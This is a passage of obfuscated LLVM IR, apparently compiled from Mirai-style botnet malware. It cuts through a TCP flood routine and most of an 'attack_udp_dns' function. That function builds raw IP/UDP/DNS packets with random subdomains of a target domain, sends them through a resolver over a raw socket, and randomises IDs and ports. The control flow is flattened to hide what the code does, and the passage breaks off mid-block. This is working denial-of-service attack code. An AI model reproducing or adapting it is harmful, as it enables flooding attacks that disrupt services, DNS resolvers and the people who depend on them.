  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 3
  store i32 %379, i32* %381, align 4
  store i32 -2042619985, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i8, i8* %27, align 1
  %384 = icmp ne i8 %383, 0
  %385 = select i1 %384, i32 1755339208, i32 -827761533
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i8*, i8** %35, align 8
  %388 = load i32, i32* %26, align 4
  call void @rand_str(i8* %387, i32 %388)
  store i32 -827761533, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i32 0, i32 7
  store i16 0, i16* %391, align 2
  %392 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %393 = bitcast %struct.iphdr* %392 to i16*
  %394 = call zeroext i16 @checksum_generic(i16* %393, i32 20)
  %395 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 7
  store i16 %394, i16* %396, align 2
  %397 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 6
  store i16 0, i16* %398, align 4
  %399 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %400 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %401 = bitcast %struct.tcphdr* %400 to i8*
  %402 = load i32, i32* %26, align 4
  %403 = sext i32 %402 to i64
  %404 = add i64 20, %403
  %405 = trunc i64 %404 to i16
  %406 = call zeroext i16 @htons(i16 zeroext %405) #7
  %407 = load i32, i32* %26, align 4
  %408 = sext i32 %407 to i64
  %409 = add i64 20, %408
  %410 = trunc i64 %409 to i32
  %411 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %399, i8* %401, i16 zeroext %406, i32 %410)
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 6
  store i16 %411, i16* %413, align 4
  %414 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 1
  %416 = load i16, i16* %415, align 2
  %417 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %418 = load i32, i32* %9, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i64 %419
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i32 0, i32 0
  %422 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %421, i32 0, i32 1
  store i16 %416, i16* %422, align 2
  %423 = load i32, i32* %10, align 4
  %424 = load i8*, i8** %32, align 8
  %425 = load i32, i32* %26, align 4
  %426 = sext i32 %425 to i64
  %427 = add i64 40, %426
  %428 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = bitcast %struct.sockaddr_in* %433 to %struct.sockaddr*
  store %struct.sockaddr* %434, %struct.sockaddr** %428, align 8
  %435 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %436 = load %struct.sockaddr*, %struct.sockaddr** %435, align 8
  %437 = call i64 @sendto(i32 %423, i8* %424, i64 %427, i32 16384, %struct.sockaddr* %436, i32 16)
  store i32 509933515, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = load i32, i32* %9, align 4
  %440 = add nsw i32 %439, 1
  store i32 %440, i32* %9, align 4
  store i32 -1391203813, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  store i32 1507227003, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %441, %438, %389, %386, %382, %378, %374, %370, %366, %360, %355, %349, %344, %338, %333, %329, %325, %304, %281, %275, %274, %273, %270, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i8*
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca [256 x i8*], align 16
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca %struct.dnshdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %39 = load i8, i8* %5, align 1
  %40 = zext i8 %39 to i64
  %41 = call noalias i8* @calloc(i64 %40, i64 8) #6
  %42 = bitcast i8* %41 to i8**
  store i8** %42, i8*** %11, align 8
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 2, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %12, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 3, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %13, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 4, i32 64)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %14, align 1
  %55 = load i8, i8* %7, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 5, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %7, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 6, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %7, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 7, i32 53)
  %66 = trunc i32 %65 to i16
  store i16 %66, i16* %17, align 2
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 9, i32 65535)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %18, align 2
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 0, i32 1458)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %19, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i8* @attack_get_opt_str(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 8, i8* null)
  store i8* %77, i8** %20, align 8
  %78 = call i32 @get_dns_resolver()
  store i32 %78, i32* %22, align 4
  %79 = load i8*, i8** %20, align 8
  store i8* %79, i8** %.reg2mem
  %switchVar = alloca i32
  store i32 1736103315, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1736103315, label %first
    i32 -1394873349, label %82
    i32 -1584545322, label %83
    i32 542104797, label %89
    i32 -980765923, label %90
    i32 672738890, label %96
    i32 1821050752, label %99
    i32 187039233, label %100
    i32 -31197196, label %106
    i32 -403305723, label %162
    i32 1944848885, label %166
    i32 -700147467, label %219
    i32 -543850040, label %224
    i32 -684366586, label %233
    i32 1302158163, label %243
    i32 -1507544097, label %246
    i32 -2016734273, label %247
    i32 481611851, label %250
    i32 -1595212691, label %265
    i32 1715416749, label %268
    i32 -1083305874, label %269
    i32 835709674, label %270
    i32 184890138, label %276
    i32 855616179, label %299
    i32 344395670, label %305
    i32 -1289914923, label %310
    i32 -196541813, label %316
    i32 -145027613, label %321
    i32 852023017, label %327
    i32 99645547, label %332
    i32 331155414, label %338
    i32 432903421, label %407
    i32 1388524065, label %410
    i32 -875280242, label %411
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8*, i8** %.reg2mem
  %80 = icmp eq i8* %.reload, null
  %81 = select i1 %80, i32 -1394873349, i32 -1584545322
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  store i32 -875280242, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i8*, i8** %20, align 8
  %85 = call i32 @util_strlen(i8* %84)
  store i32 %85, i32* %21, align 4
  %86 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %86, i32* %10, align 4
  %87 = icmp eq i32 %86, -1
  %88 = select i1 %87, i32 542104797, i32 -980765923
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -875280242, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %91 = load i32, i32* %10, align 4
  %92 = bitcast i32* %9 to i8*
  %93 = call i32 @setsockopt(i32 %91, i32 0, i32 3, i8* %92, i32 4) #6
  %94 = icmp eq i32 %93, -1
  %95 = select i1 %94, i32 672738890, i32 1821050752
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %10, align 4
  %98 = call i32 @close(i32 %97)
  store i32 -875280242, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 187039233, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %9, align 4
  %102 = load i8, i8* %5, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  %105 = select i1 %104, i32 -31197196, i32 1715416749
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %107 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %108 = load i8**, i8*** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  store i8* %107, i8** %111, align 8
  %112 = load i8**, i8*** %11, align 8
  %113 = load i32, i32* %9, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8*, i8** %112, i64 %114
  %116 = load i8*, i8** %115, align 8
  %117 = bitcast i8* %116 to %struct.iphdr*
  store %struct.iphdr* %117, %struct.iphdr** %26, align 8
  %118 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i64 1
  %120 = bitcast %struct.iphdr* %119 to %struct.udphdr*
  store %struct.udphdr* %120, %struct.udphdr** %27, align 8
  %121 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %122 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %121, i64 1
  %123 = bitcast %struct.udphdr* %122 to %struct.dnshdr*
  store %struct.dnshdr* %123, %struct.dnshdr** %28, align 8
  %124 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %125 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %124, i64 1
  %126 = bitcast %struct.dnshdr* %125 to i8*
  store i8* %126, i8** %29, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = and i8 %129, 15
  %131 = or i8 %130, 64
  store i8 %131, i8* %128, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = and i8 %134, -16
  %136 = or i8 %135, 5
  store i8 %136, i8* %133, align 4
  %137 = load i8, i8* %12, align 1
  %138 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 1
  store i8 %137, i8* %139, align 1
  %140 = load i8, i8* %19, align 1
  %141 = zext i8 %140 to i64
  %142 = add i64 41, %141
  %143 = add i64 %142, 2
  %144 = load i32, i32* %21, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 %143, %145
  %147 = add i64 %146, 4
  %148 = trunc i64 %147 to i16
  %149 = call zeroext i16 @htons(i16 zeroext %148) #7
  %150 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 2
  store i16 %149, i16* %151, align 2
  %152 = load i16, i16* %13, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %152) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 3
  store i16 %153, i16* %155, align 4
  %156 = load i8, i8* %14, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 5
  store i8 %156, i8* %158, align 4
  %159 = load i8, i8* %15, align 1
  %160 = icmp ne i8 %159, 0
  %161 = select i1 %160, i32 -403305723, i32 1944848885
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 4
  store i16 %163, i16* %165, align 2
  store i32 1944848885, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 6
  store i8 17, i8* %168, align 1
  %169 = load i32, i32* @LOCAL_ADDR, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 8
  store i32 %169, i32* %171, align 4
  %172 = load i32, i32* %22, align 4
  %173 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 9
  store i32 %172, i32* %174, align 4
  %175 = load i16, i16* %16, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %178 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %177, i32 0, i32 0
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %17, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %182 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = load i8, i8* %19, align 1
  %184 = zext i8 %183 to i64
  %185 = add i64 21, %184
  %186 = add i64 %185, 2
  %187 = load i32, i32* %21, align 4
  %188 = sext i32 %187 to i64
  %189 = add i64 %186, %188
  %190 = add i64 %189, 4
  %191 = trunc i64 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #7
  %193 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 2
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %18, align 2
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %198 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %197, i32 0, i32 0
  store i16 %196, i16* %198, align 2
  %199 = call zeroext i16 @htons(i16 zeroext 256) #7
  %200 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %201 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = call zeroext i16 @htons(i16 zeroext 1) #7
  %203 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %204 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %203, i32 0, i32 2
  store i16 %202, i16* %204, align 2
  %205 = load i8, i8* %19, align 1
  %206 = load i8*, i8** %29, align 8
  %207 = getelementptr inbounds i8, i8* %206, i32 1
  store i8* %207, i8** %29, align 8
  store i8 %205, i8* %206, align 1
  %208 = load i8, i8* %19, align 1
  %209 = zext i8 %208 to i32
  %210 = load i8*, i8** %29, align 8
  %211 = sext i32 %209 to i64
  %212 = getelementptr inbounds i8, i8* %210, i64 %211
  store i8* %212, i8** %29, align 8
  %213 = load i8*, i8** %29, align 8
  store i8* %213, i8** %30, align 8
  %214 = load i8*, i8** %29, align 8
  %215 = getelementptr inbounds i8, i8* %214, i64 1
  %216 = load i8*, i8** %20, align 8
  %217 = load i32, i32* %21, align 4
  %218 = add nsw i32 %217, 1
  call void @util_memcpy(i8* %215, i8* %216, i32 %218)
  store i32 0, i32* %23, align 4
  store i32 -700147467, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %23, align 4
  %221 = load i32, i32* %21, align 4
  %222 = icmp slt i32 %220, %221
  %223 = select i1 %222, i32 -543850040, i32 481611851
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8*, i8** %20, align 8
  %226 = load i32, i32* %23, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds i8, i8* %225, i64 %227
  %229 = load i8, i8* %228, align 1
  %230 = sext i8 %229 to i32
  %231 = icmp eq i32 %230, 46
  %232 = select i1 %231, i32 -684366586, i32 1302158163
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8, i8* %24, align 1
  %235 = load i8*, i8** %30, align 8
  store i8 %234, i8* %235, align 1
  store i8 0, i8* %24, align 1
  %236 = load i8, i8* %25, align 1
  %237 = add i8 %236, 1
  store i8 %237, i8* %25, align 1
  %238 = load i8*, i8** %29, align 8
  %239 = load i32, i32* %23, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %238, i64 %240
  %242 = getelementptr inbounds i8, i8* %241, i64 1
  store i8* %242, i8** %30, align 8
  store i32 -1507544097, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8, i8* %24, align 1
  %245 = add i8 %244, 1
  store i8 %245, i8* %24, align 1
  store i32 -1507544097, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  store i32 -2016734273, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i32, i32* %23, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %23, align 4
  store i32 -700147467, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8, i8* %24, align 1
  %252 = load i8*, i8** %30, align 8
  store i8 %251, i8* %252, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = load i32, i32* %21, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  %257 = getelementptr inbounds i8, i8* %256, i64 2
  %258 = bitcast i8* %257 to %struct.grehdr*
  store %struct.grehdr* %258, %struct.grehdr** %31, align 8
  %259 = call zeroext i16 @htons(i16 zeroext 1) #7
  %260 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %261 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %260, i32 0, i32 0
  store i16 %259, i16* %261, align 2
  %262 = call zeroext i16 @htons(i16 zeroext 1) #7
  %263 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %264 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  store i32 -1595212691, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i32, i32* %9, align 4
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %9, align 4
  store i32 187039233, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 -1083305874, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 835709674, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32, i32* %9, align 4
  %272 = load i8, i8* %5, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp slt i32 %271, %273
  %275 = select i1 %274, i32 184890138, i32 1388524065
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  %277 = bitcast [256 x i8*]* %32 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %277, i8* bitcast ([256 x i8*]* @attack_udp_dns.dns_array to i8*), i64 2048, i32 16, i1 false)
  %278 = call i32 @rand() #6
  %279 = srem i32 %278, 256
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [256 x i8*], [256 x i8*]* %32, i64 0, i64 %280
  %282 = load i8*, i8** %281, align 8
  store i8* %282, i8** %33, align 8
  %283 = load i8*, i8** %33, align 8
  %284 = bitcast i8* %283 to %struct.iphdr*
  store %struct.iphdr* %284, %struct.iphdr** %34, align 8
  %285 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i64 1
  %287 = bitcast %struct.iphdr* %286 to %struct.udphdr*
  store %struct.udphdr* %287, %struct.udphdr** %35, align 8
  %288 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i64 1
  %290 = bitcast %struct.udphdr* %289 to %struct.dnshdr*
  store %struct.dnshdr* %290, %struct.dnshdr** %36, align 8
  %291 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %292 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %291, i64 1
  %293 = bitcast %struct.dnshdr* %292 to i8*
  %294 = getelementptr inbounds i8, i8* %293, i64 1
  store i8* %294, i8** %37, align 8
  %295 = load i16, i16* %13, align 2
  %296 = zext i16 %295 to i32
  %297 = icmp eq i32 %296, 65535
  %298 = select i1 %297, i32 855616179, i32 344395670
  store i32 %298, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = call i32 @rand_next()
  %301 = and i32 %300, 65535
  %302 = trunc i32 %301 to i16
  %303 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 3
  store i16 %302, i16* %304, align 4
  store i32 344395670, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i16, i16* %16, align 2
  %307 = zext i16 %306 to i32
  %308 = icmp eq i32 %307, 65535
  %309 = select i1 %308, i32 -1289914923, i32 -196541813
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %311 = call i32 @rand_next()
  %312 = and i32 %311, 65535
  %313 = trunc i32 %312 to i16
  %314 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 0
  store i16 %313, i16* %315, align 2
  store i32 -196541813, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load i16, i16* %17, align 2
  %318 = zext i16 %317 to i32
  %319 = icmp eq i32 %318, 65535
  %320 = select i1 %319, i32 -145027613, i32 852023017
  store i32 %320, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  %322 = call i32 @rand_next()
  %323 = and i32 %322, 65535
  %324 = trunc i32 %323 to i16
  %325 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %326 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %325, i32 0, i32 1
  store i16 %324, i16* %326, align 2
  store i32 852023017, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i16, i16* %18, align 2
  %329 = zext i16 %328 to i32
  %330 = icmp eq i32 %329, 65535
  %331 = select i1 %330, i32 99645547, i32 331155414
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = call i32 @rand_next()
  %334 = and i32 %333, 65535
  %335 = trunc i32 %334 to i16
  %336 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %337 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %336, i32 0, i32 0
  store i16 %335, i16* %337, align 2
  store i32 331155414, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i8*, i8** %37, align 8
  %340 = load i8, i8* %19, align 1
  %341 = zext i8 %340 to i32
  %342 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %339, i32 %341)
  %343 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 7
  store i16 0, i16* %344, align 2
  %345 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %346 = bitcast %struct.iphdr* %345 to i16*
  %347 = call zeroext i16 @checksum_generic(i16* %346, i32 20)
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 7
  store i16 %347, i16* %349, align 2
  %350 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 3
  store i16 0, i16* %351, align 2
  %352 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %353 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %354 = bitcast %struct.udphdr* %353 to i8*
  %355 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %356 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %355, i32 0, i32 2
  %357 = load i16, i16* %356, align 2
  %358 = load i8, i8* %19, align 1
  %359 = zext i8 %358 to i64
  %360 = add i64 21, %359
  %361 = add i64 %360, 2
  %362 = load i32, i32* %21, align 4
  %363 = sext i32 %362 to i64
  %364 = add i64 %361, %363
  %365 = add i64 %364, 4
  %366 = trunc i64 %365 to i32
  %367 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %352, i8* %354, i16 zeroext %357, i32 %366)
  %368 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %369 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %368, i32 0, i32 3
  store i16 %367, i16* %369, align 2
  %370 = load i32, i32* %22, align 4
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 0
  %376 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %375, i32 0, i32 2
  %377 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %376, i32 0, i32 0
  store i32 %370, i32* %377, align 4
  %378 = load %struct.udphdr*, %struct.udphdr** %35, align 8
